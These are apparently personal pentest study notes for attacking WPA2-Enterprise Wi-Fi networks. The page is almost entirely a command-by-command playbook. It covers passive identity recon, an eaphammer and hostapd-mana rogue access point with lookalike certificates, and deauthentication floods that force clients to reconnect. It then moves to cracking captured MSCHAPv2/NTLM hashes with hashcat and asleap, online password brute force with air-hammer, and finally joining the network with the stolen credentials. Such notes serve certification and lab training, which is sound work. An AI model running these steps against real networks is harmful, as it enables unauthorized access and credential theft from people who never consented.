# [MGT] WPA2 Enterprise (WPA2-E)

Refer to this website for reference: 

https://systemweakness.com/defeating-wpa2-enterprise-peap-authentication-418829b8922c

https://github.com/drewlong/oswp_notes/tree/main

---

### **Recon**

- Passively scan in wireshark (in sudo) to look for domain name and user
    - filter for `eap` and look for “Response, Identity” packets
    
    ![Untitled](Untitled%2044.png)
    
- Use [pcapFilter.sh](http://pcapFilter.sh) to display certificates used by AP with MGT
    - `bash pcapFilter.sh -f /home/user/kali/<filename>.pcap -C`
- Check EAP Methods supported by AP
    
    ```bash
    cd /root/tools/EAP_buster/ 
    bash ./EAP_buster.sh <AP-NAME> 'domain\username' wlan0mon
    ```
    
- To find a user’s password in the domain, use EAPhammer
    - `cd /root/tools/eaphammer` - navigate to eaphammer folder
    - `python3 ./eaphammer --cert-wizard`
    - `python3 ./eaphammer -i wlan1 --auth wpa-eap --essid <AP NAME> --creds --negotiate balanced`
- Then send DEAUTH packets to disconnect client
    - `aireplay-ng -0 0 -a <AP MAC> -c <CLIENT MAC> wlan0mon`
    - IF NTLM HASHES NOT SHOWN, CHANGE CLIENT MAC
- Brute force the hash
    - `hashcat -a 0 -m 5500 <NTLM_hash> ~/rockyou.txt --force`
- If need to brute force user account in a domain using **air-hammer**
    - `cd air-hammer`
    - `echo '$DOMAIN\$USERNAME' > test.user`
    - `./air-hammer.py -i wlan1 -e <AP NAME> -p rockyou.txt -u test.user`

---

### **Main Section**

Activate monitoring mode

- `sudo airmon-ng check kill && sudo airmon-ng start <interface>`
- Check AUTH Column
    - `sudo airodump-ng <interface>`

*Note: AUTH column will say MGT*

- Change channel of wlan0mon to target AP’s channel
    - `sudo iwconfig wlan0mon channel <channel-number>`
- Capture handshake
    - `sudo airodump-ng -c <channel> -w <output_file_name> wlan0mon`
- Send deauth to client to capture handshake
    - `sudo aireplay-ng -0 0 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon`
- Analyze with tshark OR wireshark if have GUI
    - `tshark -r <filename>.pcap -Y 'wlan.bssid==E8:9C:12:02:66:AA && eap && tls.handshake.certificate'`
        
        OR
        
    - `tshark -r <filename>.pcap -Y 'tls.handshake.type == 11,3'`
        
        *if using GUI:* 
        
        *View the packet details in TLSv1 Record Layer >> Handshake Protocol >> Certificate >> Right-Click Select Export Packet Bytes to save data into .der extension*
        
        `tshark -r <capture_file> -T fields -e frame.number -e tls.handshake.certificate | grep "Certificate" | cut -d' ' -f2 | xargs -I {} tshark -r <capture_file> -w cert.der -Y frame.number == {}`
        
        - **Details of the filters**
            - `<capture_file>`: Replace this with the actual filename of your capture file (e.g., mycapture.pcap).
            - `T fields`: This tells tshark to display output in a field-based format.
            - `e frame.number`: This specifies to capture the frame number.
            - `e tls.handshake.certificate`: This captures the value of the "Certificate" field in the TLS handshake.
            - `grep "Certificate"`: This filters the output to only show lines containing "Certificate".
            - `cut -d' ' -f2`: This extracts the second field (frame number) separated by space from the filtered line.
            - `xargs -I {}`: This takes the extracted frame number and passes it to the next command as `{}`.
            - `tshark -r <capture_file> -w cert.der -Y frame.number == {}`: This reruns tshark to capture the entire packet data based on the extracted frame number and writes it to a file named "cert.der" using the `w` flag.
            - `Y frame.number == {}`: This filter within the second tshark command ensures only the packet with the matching frame number is written to the output file.
- Then check validity of certificate
    - `openssl x509 -inform der -in cert.der -text`
    
    *details needed for attack include: issuer information*
    
- Edit **ca.cnf** and **server.cnf** files to less sus cert and authority fields
    - `sudo vi /etc/freeradius/3.0/certs/ca.cnf`
        - Refer to this for reference
        
        ![Untitled](Untitled%2045.png)
        
    - `sudo vi /etc/freeradius/3.0/certs/server.cnf`
        - Refer to this for reference
        
        ![Untitled](Untitled%2046.png)
        
        *What to fill in doesn’t matter, as long as its not EMPTY*
        
- Navigate to /etc/freeradius/3.0/certs/
    - Then run
        - `sudo rm dh && make`
    - *note, ignore error from freeRADIUS if it expects other configs*
- Edit /etc/hostapd-mana/mana.conf with **correct SSID, certificate paths and EAP file**
    - `sudo vi /etc/hostapd-mana/mana.conf`
    
    **Sample mana.conf**
    
    ```bash
    # Template Config File for hostapd-mana command:
    interface=wlan0
    ssid=apname
    channel=1
    ieee80211n=1
    hw_mode=g 
    # if 5ghz, set to a
    wpa=3 
    # 1 only enables WPA, 2 is WPA2
    wpa_key_mgmt=WPA-PSK
    wpa_passphrase=ANYPASSWORD 
    # actual value irrelevant, as we are trying to capture handshake, has to be between 8 - 63 characters
    wpa_pairwise=TKIP CCMP 
    # WPA only
    rsn_pairwise=TKIP CCMP 
    # WPA2 only, since using option 3, we enable both
    mana_wpaout=/home/kali/name.hccapx 
    # specifies where to save handshakes, each handshake is appended to the file, can be decrypted with hashcat -m 2500 or aircrack-ng
    # if mana_wpaout is producing error: unknown configuration item 'mana_wpaout' make sure you are using command hostapd-mana and not hostapd command
    ```
    
- Set up mana.eap_user
    - Configure `/etc/hostapd-mana/mana.eap_user` with desired protocols and AUTH methods
    - `sudo vi /etc/hostapd-mana/mana.eap_user`
- Start hostapd-mana
    - `sudo hostapd-mana /etc/hostapd-mana/mana.conf`
- Use asleap to find user based on the output from running the previous command
    - `sudo asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst`
- Create wpa_supplicant.conf file
    
    ```bash
    network={
      ssid="NetworkName" #change this
      scan_ssid=1
      key_mgmt=WPA-EAP
      identity="Domain\username" # replace this to match username from hostapd-mana output 
      password="password" # same as above
      eap=PEAP
      phase1="peaplabel=0"
      phase2="auth=MSCHAPV2"
    }
    ```
    
- Connect to network using wpa_supplicant
    - `sudo wpa_supplicant -c <config_file>`